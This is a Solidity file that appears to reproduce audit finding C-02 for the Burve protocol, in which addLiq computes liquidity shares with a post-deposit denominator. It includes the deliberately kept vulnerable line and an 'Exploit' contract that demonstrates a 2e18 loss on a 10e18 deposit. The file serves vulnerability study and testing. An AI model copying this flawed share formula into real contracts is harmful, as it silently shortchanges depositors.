// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Burve finding 55209 (C-02):
// "Incorrect `cumulativeValue` in `LiqFacet::addLiq` gives less shares to users".
//
// Real audited source (the vulnerable share-computation block is reproduced
// VERBATIM from the finding's embedded snippet; the vulnerable line is @>):
//   protocol Burve
//   contract LiqFacet   fn addLiq   (cumulativeValue accumulation + AssetLib.add)
//   helper   AssetLib::add  (shares = FullMath.mulDiv(num, total, denom))
//   report   github.com/pashov/audits/blob/master/team/md/Burve-security-review_2025-01-29.md
//
// Root cause: `cumulativeValue` (the denominator of the share formula
// shares = mulDiv(addedBalance, totalShares, cumulativeValue)) is initialized
// to `tokenBalance` — the token reserve AFTER the user's own deposit is pulled
// in — instead of `preBalance[idx]` (the reserve BEFORE the deposit). The
// denominator is therefore inflated by exactly `addedBalance`, so the user is
// minted FEWER shares than their contribution warrants. On withdrawal they
// recover less value than they deposited; the shortfall accrues to the
// pre-existing LPs (dilution / value theft).
//
// Worked example from the finding (n=3 tokens, all edges priced 1:1, total
// shares 100):
//   preBalance[idx]=10, deposit=10  -> tokenBalance=20
//   BUG:  cumulativeValue = tokenBalance = 20; loop +10 +10 -> 40
//         shares = 10*100/40 = 25 ; on withdraw 25/125 of value 40 = 8  (deposited 10, LOSS 2)
//   FIX:  cumulativeValue = preBalance[idx] = 10; loop +10 +10 -> 30
//         shares = 10*100/30 ~= 33 ; on withdraw 33/133 of value 40 ~= 10   (no loss)
//
// FullMath (real full-precision mulDiv/mulX128), AssetLib.add (verbatim share
// formula + the `require(num == denom, "NDE")` the finding recommends removing),
// the diamond `Store`, the priced `Edge`, and the ERC20 reserves are all
// faithful minimal doubles with real transfers/accounting — only the marked
// line carries the bug.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

/// @dev Burve closure identifier (user-defined value type), threaded verbatim
///      into `AssetLib.add(recipient, cid, ...)`.
type ClosureId is uint256;

/// @dev Faithful registry of the tokens participating in a closure.
struct TokenRegistry {
    address[] tokens;
}

/// @dev A priced edge between two tokens. In Burve the price comes from the
///      edge's curve, not the instantaneous reserve ratio — modelled here as a
///      configured X128 price (set to 1:1 to match the finding's example).
struct Edge {
    uint256 priceX128;
}

/// @dev Faithful double of Burve's per-edge price accessors. Returns the edge's
///      configured price regardless of ordering direction (1:1 here), so the
///      `token < otherToken` branch selection does not affect the result.
library EdgeImpl {
    function getInvPriceX128(Edge storage e, uint256, uint256) internal view returns (uint256) {
        return e.priceX128;
    }

    function getPriceX128(Edge storage e, uint256, uint256) internal view returns (uint256) {
        return e.priceX128;
    }
}

/// @dev Real full-precision math, byte-compatible with Burve's FullMath usage.
library FullMath {
    /// @notice Uniswap-v3-style 512-bit muldiv: floor(a * b / denominator).
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {
            uint256 prod0;
            uint256 prod1;
            assembly {
                let mm := mulmod(a, b, not(0))
                prod0 := mul(a, b)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }
            if (prod1 == 0) {
                require(denominator > 0);
                assembly {
                    result := div(prod0, denominator)
                }
                return result;
            }
            require(denominator > prod1);
            uint256 remainder;
            assembly {
                remainder := mulmod(a, b, denominator)
            }
            assembly {
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }
            uint256 twos = denominator & (~denominator + 1);
            assembly {
                denominator := div(denominator, twos)
            }
            assembly {
                prod0 := div(prod0, twos)
            }
            assembly {
                twos := add(div(sub(0, twos), twos), 1)
            }
            prod0 |= prod1 * twos;
            uint256 inv = (3 * denominator) ^ 2;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            result = prod0 * inv;
            return result;
        }
    }

    /// @notice a * b >> 128, with optional round-up (Burve `mulX128`).
    function mulX128(uint256 x, uint256 y, bool roundUp) internal pure returns (uint256 result) {
        result = mulDiv(x, y, 1 << 128);
        if (roundUp && mulmod(x, y, 1 << 128) != 0) {
            result += 1;
        }
    }
}

/// @dev Faithful diamond storage for the vulnerable facet.
library Store {
    bytes32 internal constant POSITION = keccak256("burve.diamond.storage");

    struct Vault {
        TokenRegistry reg;
        mapping(address => uint256) reserves; // pooled token balances
        mapping(bytes32 => Edge) edges; // priced edges by unordered pair key
        mapping(uint256 => uint256) totalShares; // per closure id
        mapping(uint256 => mapping(address => uint256)) balances; // per closure id, per holder
    }

    function store() internal pure returns (Vault storage v) {
        bytes32 p = POSITION;
        assembly {
            v.slot := p
        }
    }

    function tokenRegistry() internal view returns (TokenRegistry storage) {
        return store().reg;
    }

    function edge(address a, address b) internal view returns (Edge storage) {
        bytes32 key = a < b ? keccak256(abi.encode(a, b)) : keccak256(abi.encode(b, a));
        return store().edges[key];
    }

    function reserve(address token) internal view returns (uint256) {
        return store().reserves[token];
    }

    function addReserve(address token, uint256 amount) internal {
        store().reserves[token] += amount;
    }

    function subReserve(address token, uint256 amount) internal {
        store().reserves[token] -= amount;
    }
}

/// @dev Faithful double of Burve's `AssetLib`. `add` reproduces the exact share
///      formula quoted in the finding, plus the `require(num == denom, "NDE")`
///      the finding recommends removing (first-deposit branch only).
library AssetLib {
    function add(address recipient, ClosureId cid, uint256 num, uint256 denom) internal returns (uint256 shares) {
        Store.Vault storage v = Store.store();
        uint256 key = ClosureId.unwrap(cid);
        uint256 total = v.totalShares[key];
        if (total == 0) {
            require(num == denom, "NDE");
            shares = num;
        } else {
            shares = FullMath.mulDiv(num, total, denom);
        }
        v.totalShares[key] += shares;
        v.balances[key][recipient] += shares;
    }

    function remove(address holder, ClosureId cid, uint256 shares) internal {
        Store.Vault storage v = Store.store();
        uint256 key = ClosureId.unwrap(cid);
        v.totalShares[key] -= shares;
        v.balances[key][holder] -= shares;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the `cumulativeValue` accumulation block of
// `LiqFacet::addLiq` is reproduced VERBATIM from the finding's embedded snippet.
// ─────────────────────────────────────────────────────────────────────────────
contract LiqFacet {
    using EdgeImpl for Edge;

    /// @notice Configure the closure's tokens and set every edge to `priceX128`.
    function initPool(address[] calldata tokens, uint256 priceX128) external {
        TokenRegistry storage reg = Store.tokenRegistry();
        for (uint256 i = 0; i < tokens.length; ++i) {
            reg.tokens.push(tokens[i]);
        }
        for (uint256 i = 0; i < tokens.length; ++i) {
            for (uint256 j = i + 1; j < tokens.length; ++j) {
                Store.edge(tokens[i], tokens[j]).priceX128 = priceX128;
            }
        }
    }

    /// @notice Faithful seed of a pre-existing balanced reserve (real transfer).
    function seedReserve(address token, uint256 amount) external {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        Store.addReserve(token, amount);
    }

    /// @notice Faithful seed of the pre-existing LP share supply.
    function seedShares(ClosureId cid, address lp, uint256 amount) external {
        Store.Vault storage v = Store.store();
        uint256 key = ClosureId.unwrap(cid);
        v.totalShares[key] += amount;
        v.balances[key][lp] += amount;
    }

    /// @notice Snapshot pre-deposit reserves, then pull `amount` of `token` in.
    ///         `tokenBalance` returned is the post-deposit reserve of `token`.
    function _snapshotAndPull(address token, uint256 amount)
        internal
        returns (uint256[] memory preBalance, uint256 idx, uint256 tokenBalance)
    {
        TokenRegistry storage reg0 = Store.tokenRegistry();
        uint256 n = reg0.tokens.length;
        preBalance = new uint256[](n);
        idx = type(uint256).max;
        for (uint256 i = 0; i < n; ++i) {
            preBalance[i] = Store.reserve(reg0.tokens[i]);
            if (reg0.tokens[i] == token) idx = i;
        }
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        Store.addReserve(token, amount);
        tokenBalance = Store.reserve(token);
    }

    /// @notice The `cumulativeValue` accumulation of Burve `LiqFacet::addLiq`,
    ///         reproduced VERBATIM from the finding-55209 embedded snippet. The
    ///         initialization on the marked line is the bug.
    function _cumulativeValue(address token, uint256[] memory preBalance, uint256 idx, uint256 tokenBalance)
        internal
        view
        returns (uint256 cumulativeValue)
    {
        uint256 n = preBalance.length;

        // ─────────── VERBATIM: Burve LiqFacet::addLiq (finding 55209) ───────────
        cumulativeValue = tokenBalance; // @> VULN: must be preBalance[idx]; using post-deposit tokenBalance inflates denom -> user minted fewer shares

        TokenRegistry storage tokenReg = Store.tokenRegistry();

        for (uint256 i = 0; i < n; ++i) {
            if (i == idx) {
                continue;
            } else if (preBalance[i] != 0) {
                address otherToken = tokenReg.tokens[i];
                Edge storage e = Store.edge(token, otherToken);
                uint256 priceX128 = (token < otherToken)
                    ? e.getInvPriceX128(tokenBalance, preBalance[i])
                    : e.getPriceX128(preBalance[i], tokenBalance);
                cumulativeValue += FullMath.mulX128(preBalance[i], priceX128, true);
            }
        }
        // ───────────────────────────── end verbatim ─────────────────────────────
    }

    /// @notice Add liquidity in `token`; the share math is VERBATIM from
    ///         Burve `LiqFacet::addLiq` (finding 55209 embedded snippet).
    function addLiq(address token, uint256 amount, address recipient, ClosureId cid)
        external
        returns (uint256 shares)
    {
        (uint256[] memory preBalance, uint256 idx, uint256 tokenBalance) = _snapshotAndPull(token, amount);

        uint256 addedBalance = tokenBalance - preBalance[idx];
        uint256 cumulativeValue = _cumulativeValue(token, preBalance, idx, tokenBalance);
        shares = AssetLib.add(recipient, cid, addedBalance, cumulativeValue);
    }

    /// @notice Faithful pro-rata withdrawal: burn `shares`, pay out their value
    ///         (in `token` terms) at the current closure value / total shares.
    function removeLiq(address token, ClosureId cid, uint256 shares, address recipient)
        external
        returns (uint256 payout)
    {
        Store.Vault storage v = Store.store();
        uint256 key = ClosureId.unwrap(cid);
        uint256 total = v.totalShares[key];

        uint256 poolValue = _closureValueInToken(token);
        payout = FullMath.mulDiv(shares, poolValue, total);

        AssetLib.remove(recipient, cid, shares);
        Store.subReserve(token, payout);
        IERC20(token).transfer(recipient, payout);
    }

    /// @notice Total closure value expressed in `token`, using the same priced
    ///         edges as `addLiq`.
    function _closureValueInToken(address token) internal view returns (uint256 value) {
        TokenRegistry storage reg = Store.tokenRegistry();
        uint256 n = reg.tokens.length;
        for (uint256 i = 0; i < n; ++i) {
            address t = reg.tokens[i];
            uint256 bal = Store.reserve(t);
            if (t == token) {
                value += bal;
            } else {
                Edge storage e = Store.edge(token, t);
                uint256 priceX128 = (token < t) ? e.getInvPriceX128(bal, bal) : e.getPriceX128(bal, bal);
                value += FullMath.mulX128(bal, priceX128, true);
            }
        }
    }

    function sharesOf(ClosureId cid, address holder) external view returns (uint256) {
        return Store.store().balances[ClosureId.unwrap(cid)][holder];
    }
}

/// @dev Faithful minimal ERC20 double for the pooled tokens.
contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Marker token: the accounting shortfall (value silently lost by the
///      depositor) is minted to SINK to quantify the harm, since dilution has
///      no positive transfer to a single attacker.
contract MarkerToken {
    string public constant name = "Burve C-02 share-shortfall marker";
    string public constant symbol = "SHORTFALL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: seed a balanced 3-token closure (10e18 each, 100e18 pre-LP
// shares), have the victim add 10e18 and receive only 25e18 shares (should be
// ~33e18), then withdraw and recover 8e18 — a 2e18 loss on a 10e18 deposit.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant INITIAL_LP = address(0xBEEF);

    MiniToken public token0;
    MiniToken public token1;
    MiniToken public token2;
    LiqFacet public vuln;
    MarkerToken public marker;

    uint256 public depositedByVictim;
    uint256 public victimShares;
    uint256 public withdrawnByVictim;
    uint256 public shortfall;

    uint256 internal constant UNIT = 10 ether; // 10e18 reserve/deposit unit
    uint256 internal constant PRE_SHARES = 100 ether; // pre-existing LP shares

    constructor() {
        token0 = new MiniToken("Token0", "TK0"); // child nonce 1
        token1 = new MiniToken("Token1", "TK1"); // child nonce 2
        token2 = new MiniToken("Token2", "TK2"); // child nonce 3
        vuln = new LiqFacet(); // child nonce 4 (VULN)
        marker = new MarkerToken(); // child nonce 5 (profit/marker)
    }

    function run() external {
        ClosureId cid = ClosureId.wrap(1);

        // configure a 3-token closure priced 1:1 (priceX128 = 1 << 128)
        address[] memory toks = new address[](3);
        toks[0] = address(token0);
        toks[1] = address(token1);
        toks[2] = address(token2);
        vuln.initPool(toks, uint256(1) << 128);

        // seed pre-existing balanced reserves (real transfers)
        token0.mint(address(this), UNIT);
        token1.mint(address(this), UNIT);
        token2.mint(address(this), UNIT);
        token0.approve(address(vuln), type(uint256).max);
        token1.approve(address(vuln), type(uint256).max);
        token2.approve(address(vuln), type(uint256).max);
        vuln.seedReserve(address(token0), UNIT);
        vuln.seedReserve(address(token1), UNIT);
        vuln.seedReserve(address(token2), UNIT);

        // pre-existing LP already holds 100e18 shares of the closure
        vuln.seedShares(cid, INITIAL_LP, PRE_SHARES);

        // ── victim adds 10e18 of token0 ──
        uint256 deposit = UNIT;
        token0.mint(address(this), deposit);
        uint256 got = vuln.addLiq(address(token0), deposit, address(this), cid);
        depositedByVictim = deposit;
        victimShares = got;

        // ── victim immediately withdraws all shares ──
        uint256 balBefore = token0.balanceOf(address(this));
        vuln.removeLiq(address(token0), cid, got, address(this));
        uint256 received = token0.balanceOf(address(this)) - balBefore;
        withdrawnByVictim = received;
        shortfall = deposit - received;

        // record the silently-lost value on the SINK marker token
        marker.mint(SINK, shortfall);

        // HARM: inflated `cumulativeValue` denominator minted only 25e18 shares
        // (not ~33e18), so the 10e18 deposit is only worth 8e18 on withdrawal.
        require(got == 25 ether, "shares not the buggy 25e18");
        require(received == 8 ether, "payout not the shorted 8e18");
        require(received < deposit, "no loss: not vulnerable");
        require(shortfall == 2 ether, "shortfall not 2e18");
    }
}
